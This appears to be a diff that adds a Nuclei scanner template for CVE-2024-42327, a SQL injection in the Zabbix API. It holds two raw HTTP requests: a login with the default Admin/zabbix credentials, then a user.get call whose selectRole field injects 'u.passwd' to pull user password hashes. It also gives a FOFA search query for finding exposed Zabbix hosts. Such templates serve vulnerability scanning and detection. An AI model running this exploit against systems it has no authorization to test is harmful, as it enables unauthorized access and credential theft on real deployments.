@@ -1,0 +1,53 @@
+id: zabbix-api_jsonrpc-sqli
+info:
+  name: zabbix api_jsonrpc.php - sqli(CVE-2024-42327)
+  author: leadlife
+  severity: high
+  description: Zabbix的addRelatedObjects函数中的CUser类中存在SQL注入，此函数由 CUser.get 函数调用，具有API访问权限的用户可利用造成越权访问高权限用户敏感信息以及执行恶意SQL语句等危害。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/Zabbix/Zabbix%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(CVE-2024-42327).md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="ZABBIX-监控系统"
+    hunter-query: demo
+  tags: zabbix,sqli
+
+http:
+  - raw:
+      - |
+        POST /api_jsonrpc.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: application/json-rpc
+        Content-Length: 106
+
+        {"jsonrpc": "2.0", "method": "user.login", "params": {"username": "Admin", "password": "zabbix"}, "id": 1}
+              
+      - |+
+        POST /api_jsonrpc.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: application/json-rpc
+        Content-Length: 167
+
+        {"jsonrpc": "2.0", "method": "user.get", "params": {"selectRole": ["roleid, u.passwd", "roleid"], "userids": "1"}, "auth": "{{api_result}}", "id": 1}
+        
+    extractors: 
+      - type: json
+        part: body
+        internal: true
+        name: api_result
+        json:
+          - ".result"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains_all(body,'roleid','passwd','Zabbix')
+        condition: and
